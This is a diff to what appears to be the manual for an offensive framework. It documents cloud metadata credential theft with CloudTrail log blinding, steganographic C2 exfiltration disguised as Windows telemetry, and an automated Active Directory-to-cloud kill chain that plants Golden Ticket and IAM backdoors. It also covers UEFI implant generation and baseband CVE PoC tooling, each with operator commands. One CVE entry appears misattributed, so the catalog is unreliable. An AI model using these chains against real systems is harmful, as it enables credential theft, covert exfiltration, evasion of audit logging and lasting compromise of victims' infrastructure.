@@ -2714,6 +2714,282 @@ Same presets as Shodan: `cameras`, `rtsp`, `mqtt`, `modbus`, `hikvision`, `tplin
 
 \newpage
 
+# Cloud Infiltration Module (`op/modules/cloud_infiltrate.py`)
+
+Targets cloud provider metadata services from a compromised host inside a cloud workload. All credential theft, enumeration, and privilege escalation is performed via localhost APIs — no network scanning required.
+
+## AWS Chain
+
+```
+IMDSv1/v2 → role name + AccessKeyId/SecretAccessKey/Token
+         → STS GetCallerIdentity
+         → IAM ListAttachedUserPolicies / ListRolePolicies (AdminAccess detection)
+         → SSM ListInstances + Lambda ListFunctions
+         → Secrets Manager + SSM Parameter Store (with-decryption)
+         → S3: ACL check + sensitive filename scan + download
+         → CloudTrail blind: StopLogging + PutEventSelectors (clear selectors)
+```
+
+| Function | Description |
+|----------|-------------|
+| `aws_imds_creds()` | IMDSv2 token → role → credentials |
+| `aws_iam_enum(creds)` | STS identity, policies, AdminAccess detection |
+| `aws_privesc(creds)` | SSM, Lambda, Secrets Manager |
+| `aws_s3_loot(creds)` | Bucket ACL + sensitive file download |
+| `aws_secrets_dump(creds)` | Secrets Manager + Parameter Store |
+| `aws_cloudtrail_blind(creds)` | Stop logging + clear event selectors |
+
+## Azure Chain
+
+```
+IMDS 169.254.169.254/metadata/identity/oauth2/token (resource=management)
+         → subscriptions + resource groups + VMs
+         → storage accounts + Key Vaults
+         → Key Vault: secrets + keys + certificates
+         → PRT theft: dsregcmd /status + ROADtoken
+```
+
+## GCP Chain
+
+```
+metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+         → projects + GCE instances + GCS buckets
+         → Cloud Functions + Secret Manager secrets
+         → Create new SA key for persistence
+```
+
+## Usage
+
+```bash
+start cloud            # interactive menu
+start cloud aws        # full AWS chain (run on EC2 instance)
+start cloud azure      # full Azure chain (run on Azure VM)
+start cloud gcp        # full GCP chain (run on GCE instance)
+start cloud auto       # fingerprint IMDS → run matching chain
+start cloud blind      # CloudTrail blind (AWS, provide keys)
+```
+
+\newpage
+
+# Steganography C2 Module (`op/modules/stego_c2.py`)
+
+Covert data exfiltration and command-and-control channels embedded in normal-looking traffic and image files.
+
+## Payload Encoding
+
+All payloads are encoded as: `zlib.compress → XOR(key) → base64`
+
+## PNG LSB Embedding
+
+- PIL loads cover PNG, iterates pixel RGB bytes
+- Encodes payload length (32-bit) in first 32 pixel channel LSBs
+- Encodes payload bits at 1 bit per channel byte
+- Capacity: (width × height × 3 − 32) bits
+
+```bash
+start stego embed cover.png payload.bin out.png   # embed
+start stego extract stego.png                     # extract
+```
+
+## JPEG EXIF Embedding
+
+- Uses `piexif` to write `UserComment` field: `UNICODE\x00` + encoded payload
+- Survives JPEG re-save if EXIF is preserved (no re-encode)
+
+## Polyglot Files (PNG + ZIP)
+
+- PNG bytes + ZIP bytes concatenated
+- Valid PNG (renderers stop at IEND) + valid ZIP (parsers read from EOF backward)
+- ZIP contains `telemetry.dat` with the payload
+
+## C2 Channels
+
+| Channel | Method | Description |
+|---------|--------|-------------|
+| DiagTrack telemetry | HTTP POST `/OneCollector/1.0/` | Mimics Windows DiagTrack service |
+| HTTP padding | Body size encodes bits | bit=0 → 64B body, bit=1 → 192B body |
+| TLS record size | TLS record lengths encode bits | Side channel, requires TLS |
+
+DiagTrack data format: payload chunked across `data.metrics.m0000..mNNNN` fields, reassembled by `sessionId`.
+
+```bash
+start stego c2 <c2host:port>   # send via DiagTrack
+start stego test               # self-test round-trip
+```
+
+\newpage
+
+# AD→Cloud Kill Chain (`op/modules/ad_cloud_chain.py`)
+
+Fully automated 6-phase chain from an initial domain foothold to cloud infrastructure takeover.
+
+## Kill Chain Phases
+
+| Phase | Action | Tools |
+|-------|--------|-------|
+| 1 | AD Recon | bloodhound-python, ldapsearch |
+| 2 | Kerberoast / AS-REP Roast | impacket GetUserSPNs.py, GetNPUsers.py |
+| 3 | DCSync (krbtgt hash) | impacket secretsdump.py |
+| 4 | Cloud credential hunt | ~/.aws, ~/.azure, ~/.config/gcloud, web.config |
+| 5 | Cloud takeover | cloud_infiltrate functions |
+| 6 | Persistence | Golden Ticket + Azure backdoor app + AWS IAM backdoor user |
+
+## AD Reconnaissance
+
+```bash
+start adchain recon <domain> <dc_ip>
+```
+
+- BloodHound Python collector (ACLs, AdminSDHolder, delegation)
+- LDAP: kerberoastable SPNs, AS-REP targets, admincount=1, MSOL accounts
+
+## Credential Attacks
+
+```bash
+start adchain roast <domain> <dc>    # Kerberoast → hashcat -m 13100
+start adchain asrep <domain> <dc>   # AS-REP (no creds) → hashcat -m 18200
+start adchain dcsync <domain> <dc>  # DCSync krbtgt → Golden Ticket
+```
+
+## Cloud Credential Hunt
+
+Scans: `~/.aws/credentials`, `~/.azure/accessTokens.json`, `~/.config/gcloud/`, environment variables, `web.config` (Azure App Service), local git repos.
+
+## Persistence
+
+- **Golden Ticket**: forged TGT with krbtgt hash (10-year validity)
+- **Azure backdoor app**: Graph API app registration + admin consent grant
+- **AWS IAM backdoor user**: new user + AdministratorAccess policy
+
+```bash
+start adchain chain <domain> <dc>   # full automated 6-phase chain
+```
+
+\newpage
+
+# UEFI Firmware Research Module (`op/modules/uefi_implant.py`)
+
+**Lab use only. `flash_firmware()` requires manual operator execution — it never runs automatically.**
+
+## Firmware Extraction
+
+```bash
+start uefi extract   # CHIPSEC: spi read 0x0 0x1000000 (16MB full flash)
+                     # Fallback: /dev/mem at 0xE0000 (128KB)
+                     # EFI vars: /sys/firmware/efi/efivars (SecureBoot/PK/KEK/db)
+```
+
+## Firmware Analysis
+
+Parses raw binary for Firmware Volume structures:
+
+1. Scan for `_FVH` signature (EFI_FIRMWARE_VOLUME_HEADER)
+2. Read FvLength, HeaderLength, Checksum
+3. Iterate FFS files within each FV
+4. Classify by file type (DXE driver, PEIM, application, etc.)
+
+```bash
+start uefi analyze firmware.bin
+start uefi secureboot              # read SecureBoot EFI variable
+```
+
+## DXE Implant Generation
+
+Generates a C-language DXE driver:
+
+- Base64 decoder built-in (no runtime dependency)
+- `DropToESP()`: writes payload to `\EFI\Microsoft\Boot\bootmgfw_real.efi`
+- EFI variable persistence marker: `WizzaImplant` GUID
+- Cross-compiled with mingw: `x86_64-w64-mingw32-gcc`
+
+```bash
+start uefi implant payload.bin    # generate + compile DXE driver
+start uefi flash                  # SHOWS command only — operator must run manually
+```
+
+## QEMU Testing (Safe Lab Environment)
+
+```bash
+start uefi qemu implant.efi       # creates OVMF test environment
+```
+
+Sets up:
+1. Copies `OVMF_CODE.fd` + `OVMF_VARS.fd` from `/usr/share/ovmf/`
+2. Creates 64MB FAT32 ESP disk image
+3. Populates `EFI/BOOT/BOOTX64.EFI`
+4. Generates `run_qemu.sh`
+
+## Integrity & Detection
+
+```bash
+start uefi integrity fw.bin baseline.bin   # SHA256 comparison, find first diff offset
+start uefi scan /boot/efi                  # walk ESP, flag unknown .efi binaries
+```
+
+\newpage
+
+# Baseband Research Framework (`op/modules/baseband_research.py`)
+
+**All analysis operates on firmware images. No live radio transmission. QEMU emulation only.**
+
+## Supported Chipsets
+
+| Vendor | Magic | Detection |
+|--------|-------|-----------|
+| Samsung Shannon | `SSSS` | NAS/RRC/MM/SMS task table scan |
+| Qualcomm | ELF header | NAS module section analysis |
+| MediaTek | MTK magic | RRC/NAS structure search |
+
+## Firmware Acquisition
+
+```bash
+start baseband acquire       # ADB: find /dev/block/by-name/modem → dd → adb pull
+                             # OTA: prints samfw.com, tadiphone.dev sources
+start baseband identify fw   # detect chipset + extract version strings
+```
+
+## Shannon Analysis
+
+Shannon CP_BASE = 0x80000000, DRAM_BASE = 0x40000000
+
+1. Find task names: NAS/RRC/MM/SMS scheduler entries
+2. Locate ASN.1 decoder patterns (BER/DER tag bytes)
+3. Map NAS message type dispatch table offsets
+4. Disassemble NAS dispatcher region with objdump
+
+```bash
+start baseband analyze fw.bin
+```
+
+## Fuzzing Harness
+
+```bash
+start baseband fuzz fw.bin   # writes harnesses to /tmp/bb_fuzz/, build.sh
+```
+
+| Harness | Target | Description |
+|---------|--------|-------------|
+| `nas_fuzz_afl.c` | `nas_parse_message()` | AFL++ persistent mode |
+| `nas_fuzz_libfuzzer.c` | `asn1_decode()` | libFuzzer |
+| `seeds/` | NAS PDUs | 3GPP attach, auth, PDN + CVE overflow cases |
+
+Build: `cd /tmp/bb_fuzz && bash build.sh`
+Run: `afl-fuzz -i seeds/ -o findings/ -- ./nas_fuzz_afl @@`
+
+## CVE Catalog
+
+| CVE | Chipset | Vulnerability | Vector |
+|-----|---------|--------------|--------|
+| CVE-2023-24033 | Samsung Shannon | SDP heap OOB (SDP attribute overflow) | Remote (SDP offer) |
+| CVE-2021-0920 | Qualcomm | NAS handler UAF (deregistration race) | Remote (NAS) |
+| CVE-2022-22294 | MediaTek | RRC OOB (SIB1 length miscalculation) | Remote (RRC) |
+
+```bash
+start baseband cve    # print catalog + generate CVE-2023-24033 PoC template
+```
+
+\newpage
+
 # Appendices
 
 ## Appendix A — Kernel CVE Summary
